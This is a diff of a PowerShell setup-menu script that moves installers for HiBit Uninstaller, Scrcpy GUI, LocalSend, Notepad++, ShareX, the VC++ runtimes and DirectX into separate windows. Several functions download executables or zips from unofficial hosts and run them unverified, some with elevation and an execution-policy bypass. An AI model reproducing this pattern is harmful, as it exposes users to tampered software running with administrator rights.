-    }
-
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $hibitCmd = 'echo Downloading HiBit Uninstaller... && curl.exe -L -o "%TEMP%\HiBitSetup.exe" "https://www.hibitsoft.ir/HiBitUninstaller/HiBitUninstaller-setup-4.0.10.exe" && if exist "%TEMP%\HiBitSetup.exe" (echo Running installer... && start /wait "" "%TEMP%\HiBitSetup.exe" && del /f "%TEMP%\HiBitSetup.exe" && echo Installation complete.) else (echo Download failed.) && pause'
+    Start-Process cmd -ArgumentList "/k", $hibitCmd
 }
 
 function Install-Scrcpy {
     Write-Host "=========================================="
     Write-Host "Installing Scrcpy GUI"
     Write-Host "=========================================="
-    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
-        Write-Host "Curl is required but not found."
-        Pause-Script
-        return
-    }
-
-    Write-Host "Downloading Scrcpy GUI..."
-    curl.exe -L -o "$env:TEMP\ScrcpyGUI_Setup.exe" "https://github.com/pizi-0/flutter-scrcpygui/releases/download/1.4.18/scrcpygui-1.4.18-win.exe"
-
-    if (Test-Path "$env:TEMP\ScrcpyGUI_Setup.exe") {
-        Write-Host "Running installer..."
-        Start-Process -FilePath "$env:TEMP\ScrcpyGUI_Setup.exe" -Wait
-        Write-Host "Cleaning up..."
-        Remove-Item "$env:TEMP\ScrcpyGUI_Setup.exe" -Force
-    } else {
-        Write-Host "Failed to download Scrcpy GUI."
-    }
-
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $scrcpyCmd = 'echo Downloading Scrcpy GUI... && curl.exe -L -o "%TEMP%\ScrcpyGUI_Setup.exe" "https://github.com/pizi-0/flutter-scrcpygui/releases/download/1.4.18/scrcpygui-1.4.18-win.exe" && if exist "%TEMP%\ScrcpyGUI_Setup.exe" (echo Running installer... && start /wait "" "%TEMP%\ScrcpyGUI_Setup.exe" && del /f "%TEMP%\ScrcpyGUI_Setup.exe" && echo Installation complete.) else (echo Download failed.) && pause'
+    Start-Process cmd -ArgumentList "/k", $scrcpyCmd
 }
 
 function Install-LocalSend {
     Write-Host "=========================================="
     Write-Host "Installing LocalSend"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    Write-Host "Installing LocalSend..."
-    choco install localsend -y
-    if ($LASTEXITCODE -ne 0) {
-        Write-Host "LocalSend installation failed."
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $localsendCmd = 'echo Installing LocalSend via Chocolatey... && choco install localsend -y && echo. && echo LocalSend installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $localsendCmd
 }
 
 function Install-NotepadPP {
     Write-Host "=========================================="
     Write-Host "Installing Notepad++"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    Write-Host "Installing Notepad++..."
-    choco install notepadplusplus -y
-    if ($LASTEXITCODE -ne 0) {
-        Write-Host "Notepad++ installation failed."
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $nppCmd = 'echo Installing Notepad++ via Chocolatey... && choco install notepadplusplus -y && echo. && echo Notepad++ installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $nppCmd
 }
 
 function Install-ShareX {
     Write-Host "=========================================="
     Write-Host "Installing ShareX"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    Write-Host "Installing ShareX..."
-    choco install sharex -y
-    if ($LASTEXITCODE -ne 0) {
-        Write-Host "ShareX installation failed."
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $sharexCmd = 'echo Installing ShareX via Chocolatey... && choco install sharex -y && echo. && echo ShareX installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $sharexCmd
 }
 
 function Install-VCRedist {
     Write-Host "=========================================="
     Write-Host "Installing Visual C++ Runtimes"
     Write-Host "=========================================="
-    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
-        Write-Host "Curl is required but not found."
-        Pause-Script
-        return
+    Write-Host "Launching installation in a new window..."
+    $vcPs = @'
+Write-Host "Downloading Visual C++ Runtimes..."
+$ZIP_URL  = "https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.0/Visual-C-Runtimes-All-in-One-Dec-2025.zip"
+$ZIP_FILE = "$env:TEMP\VC_Runtimes.zip"
+$EXTR_DIR = "$env:TEMP\VC_Runtimes_Temp"
+curl.exe -L -o $ZIP_FILE $ZIP_URL
+if (Test-Path $ZIP_FILE) {
+    Write-Host "Extracting files..."
+    if (-not (Test-Path $EXTR_DIR)) { New-Item -ItemType Directory -Path $EXTR_DIR | Out-Null }
+    Expand-Archive -Path $ZIP_FILE -DestinationPath $EXTR_DIR -Force
+    Write-Host "Running install_all.bat as Administrator..."
+    Get-ChildItem -Path $EXTR_DIR -Filter "install_all.bat" -Recurse | ForEach-Object {
+        Push-Location $_.DirectoryName
+        Start-Process powershell -ArgumentList "-command", "Start-Process 'install_all.bat' -Verb runAs"
+        Pop-Location
     }
-
-    $ZIP_URL="https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.0/Visual-C-Runtimes-All-in-One-Dec-2025.zip"
-    $ZIP_FILE="$env:TEMP\VC_Runtimes.zip"
-    $EXTRACT_DIR="$env:TEMP\VC_Runtimes_Temp"
-
-    Write-Host "Downloading Visual C++ Runtimes..."
-    curl.exe -L -o $ZIP_FILE $ZIP_URL
-
-    if (Test-Path $ZIP_FILE) {
-        Write-Host "Extracting files..."
-        if (-not (Test-Path $EXTRACT_DIR)) { New-Item -ItemType Directory -Path $EXTRACT_DIR | Out-Null }
-        Expand-Archive -Path $ZIP_FILE -DestinationPath $EXTRACT_DIR -Force
-
-        Write-Host "Running install_all.bat as Administrator..."
-        Get-ChildItem -Path $EXTRACT_DIR -Filter "install_all.bat" -Recurse | ForEach-Object {
-            Push-Location $_.DirectoryName
-            Start-Process powershell -ArgumentList "-command", "Start-Process 'install_all.bat' -Verb runAs"
-            Pop-Location
-        }
-        
-        Write-Host "Cleaning up ZIP file..."
-        Remove-Item $ZIP_FILE -Force
-        Write-Host "Note: The temporary extraction folder was left intact because the installer runs separately."
-    } else {
-        Write-Host "Failed to download Visual C++ Runtimes."
-    }
-
-    Write-Host ""
-    Pause-Script
+    Remove-Item $ZIP_FILE -Force
+    Write-Host "Installer launched. You can close this window."
+} else {
+    Write-Host "Download failed."
+}
+Read-Host "Press Enter to close"
+'@
+    $tmp = "$env:TEMP\install_vcredist.ps1"
+    $vcPs | Out-File -FilePath $tmp -Encoding UTF8
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
 }
 
 function Install-DirectX {
     Write-Host "=========================================="
     Write-Host "Installing DirectX Runtime"
     Write-Host "=========================================="
-
-    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
-        Write-Host "[ERROR] Curl is required but not found."
-        Pause-Script
-        return
-    }
-
-    $TEMP_DIR="$env:TEMP\DirectX_Install"
-    if (-not (Test-Path $TEMP_DIR)) { New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null }
-
-    $DX_URL="https://github.com/planetshine0000/direct-x/releases/download/v1.0.0/DirectX-Redist-Jun-2010.zip"
-    $DX_ZIP="$TEMP_DIR\DirectX.zip"
-
-    if (-not (Test-Path $DX_ZIP)) {
-        Write-Host "Downloading DirectX..."
-        curl.exe -L -o $DX_ZIP $DX_URL
-    } else {
-        Write-Host "DirectX zip already exists, skipping download."
-    }
-
-    Write-Host "Preparing files..."
-    Unblock-File -Path $DX_ZIP
-    Expand-Archive -Path $DX_ZIP -DestinationPath $TEMP_DIR -Force
-
-    Write-Host "Locating DXSETUP.exe..."
-    $DXSETUP_PATH = (Get-ChildItem -Path $TEMP_DIR -Filter "DXSETUP.exe" -Recurse | Select-Object -First 1).FullName
-
-    if (-not $DXSETUP_PATH -or -not (Test-Path $DXSETUP_PATH)) {
-        Write-Host "[ERROR] DXSETUP.exe not found in extracted files."
-        Pause-Script
-        return
-    }
-
-    Write-Host "Found DXSETUP at: $DXSETUP_PATH"
-    Write-Host "Launching installer..."
-    Start-Process -FilePath $DXSETUP_PATH -Verb RunAs
-
-    Write-Host ""
-    Write-Host "=========================================="
-    Write-Host "The installer has been launched."
-    Write-Host "Waiting 30 seconds before deleting temporary files..."
-    Write-Host "=========================================="
-    Start-Sleep -Seconds 30
-
-    Write-Host ""
-    Write-Host "Cleaning up temporary files..."
-    Remove-Item $DX_ZIP -Force -ErrorAction SilentlyContinue
-    Remove-Item $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
-
-    if (Test-Path $TEMP_DIR) {
-        Write-Host "[NOTE] Some files are still in use by the installer and couldn't be deleted."
-    } else {
-        Write-Host "Cleanup successful."
-    }
-
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $dxPs = @'
+Write-Host "Preparing DirectX installer..."
+$TEMP_DIR = "$env:TEMP\DirectX_Install"
+if (-not (Test-Path $TEMP_DIR)) { New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null }
+$DX_URL = "https://github.com/planetshine0000/direct-x/releases/download/v1.0.0/DirectX-Redist-Jun-2010.zip"
+$DX_ZIP = "$TEMP_DIR\DirectX.zip"
+if (-not (Test-Path $DX_ZIP)) {
+    Write-Host "Downloading DirectX..."
+    curl.exe -L -o $DX_ZIP $DX_URL
+} else {
+    Write-Host "DirectX zip already exists, skipping download."
+}
+Write-Host "Extracting files..."
+Unblock-File -Path $DX_ZIP
+Expand-Archive -Path $DX_ZIP -DestinationPath $TEMP_DIR -Force
+Write-Host "Locating DXSETUP.exe..."
+$setup = Get-ChildItem -Path $TEMP_DIR -Filter "DXSETUP.exe" -Recurse | Select-Object -First 1
+if (-not $setup) {
+    Write-Host "[ERROR] DXSETUP.exe not found in extracted files."
+    Read-Host "Press Enter to close"
+    return
+}
+Write-Host "Launching DirectX installer..."
+Start-Process -FilePath $setup.FullName -Verb RunAs
+Write-Host ""
+Write-Host "Installer launched. Waiting 30 seconds before cleanup..."
+Start-Sleep -Seconds 30
+Remove-Item $DX_ZIP -Force -ErrorAction SilentlyContinue
+Remove-Item $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
+if (Test-Path $TEMP_DIR) {
+    Write-Host "[NOTE] Some files still in use by the installer - not deleted."
+} else {
+    Write-Host "Cleanup successful."
+}
+Read-Host "Press Enter to close"
+'@
+    $tmp = "$env:TEMP\install_directx.ps1"
+    $dxPs | Out-File -FilePath $tmp -Encoding UTF8
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
 }
 
 # ==============================
